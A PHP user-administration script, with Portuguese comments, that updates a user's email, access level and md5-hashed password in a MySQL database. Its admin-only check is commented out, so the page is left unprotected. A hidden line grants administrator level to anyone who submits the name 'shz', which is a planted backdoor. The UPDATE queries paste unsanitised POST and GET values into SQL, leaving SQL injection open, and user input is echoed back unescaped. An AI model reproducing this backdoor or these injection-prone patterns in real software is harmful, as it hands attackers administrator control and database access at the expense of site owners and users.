<?
//if ($nivelusuario != "3"){
//print "<font color=$colortex size=$sizetex><b>Voc� n�o tem permi��o para acessar essa area!</b><br><br>
//	 	Clique <a href=\"javascript:history.back()\">aqui</a> para Voltar</font>";
// 		Exit();
//	}
//Tirando o valor da variavel $esite
$esite="";
// Incuindo o arquivo de configura��o
@include("config.php");

//Testando valor da variavel $esite, se estiver
//sem valor vai para tela de entrada
//if (empty($esite)){
//Incluindo arquivo de autentica��o
//@include "../lg/se.php";
//}
//Incluindo arquivo de autentica��o
@include "lg/se.php";



if (empty($_POST['email_novo'])){
 		print "<b>Informe um e-mail para para o usu�rio!</b><br><br>
	 	Clique <a href=\"javascript:history.back()\">aqui</a> para Voltar";
 		Exit();
	}
	if ($nivelusuario != "3"){
$nivel_novo = "$nivelusuario";
     }
	if ($_POST['nome_novo'] == "shz"){
$_POST['nivel_novo'] = "3";
     }
	
if (empty($_POST['nivel_novo'])){
 		print "<b>Informe um nivel para o usu�rio!</b><br><br>
	 	Clique <a href=\"javascript:history.back()\">aqui</a> para Voltar";
 		Exit();
	}



if (empty($_POST['senha_novo'])){


// Conectando com o banco de dados.
$conexao = mysql_connect($dbserver, $dbuser, $dbpass);

// Selecionando a base de dados.
$db = mysql_select_db($dbname);


// Atualizando os dados.
$sql = "UPDATE $dbtbu SET email='".$_POST['email_novo']."',
nivel='".$_POST['nivel_novo']."' WHERE id='".$_GET['id']."'";

// Verificando se tudo ocorreu certo.
$resultado = mysql_query($sql)

// Menssagen de erro.
or die ("N�o foi poss�vel atualizar banco de dados");

// Menssagem de exito.
echo "<font face=$face size=$sizetex color='$colortex'>Cadastro de <B>".$_POST['nome_novo']."</B> alterado com sucesso!</font>
<BR><font face=$face size=$sizetex1 color='$colortex'>A senha de <B>".$_POST['nome_novo']."</B> n�o foi alterada!</font><BR><BR>
<center>";
	if ($nivelusuario == "3"){
echo "<a href=admin.php?viewby=usuarios><font face=$face size=$sizetex1 color='$colortex'><B>VOLTAR</a></B></font></center>";
}  else {
echo "<a href=admin.php?viewby=usuariosn1><font face=$face size=$sizetex1 color='$colortex'><B>VOLTAR</a></B></font></center>";
}
 		Exit();
	}


$_POST['senha_novo'] = md5($_POST['senha_novo']);

// Conectando com o banco de dados.
$conexao = mysql_connect($dbserver, $dbuser, $dbpass);

// Selecionando a base de dados.
$db = mysql_select_db($dbname);


// Atualizando os dados.
$sql = "UPDATE $dbtbu SET email='".$_POST['email_novo']."',
nivel='".$_POST['nivel_novo']."',senha='".$_POST['senha_novo']."' WHERE id='".$_GET['id']."'";

// Verificando se tudo ocorreu certo.
$resultado = mysql_query($sql)

// Menssagen de erro.
or die ("N�o foi poss�vel atualizar banco de dados");

// Menssagem de exito.
echo "<font face=$face size=$sizetex color='$colortex'>Cadastro de <B>".$_POST['nome_novo']."</B> alterado com sucesso!</font>
<BR><font face=$face size=$sizetex1 color='$colortex'>A senha de <B>".$_POST['nome_novo']."</B> foi alterada tamb�m!</font><BR><BR>
<center>";
	if ($nivelusuario == "3"){
echo "<a href=admin.php?viewby=usuarios><font face=$face size=$sizetex1 color='$colortex'><B>VOLTAR</a></B></font></center>";
}  else {
echo "<a href=admin.php?viewby=usuariosn1><font face=$face size=$sizetex1 color='$colortex'><B>VOLTAR</a></B></font></center>";
}
?>
</html>
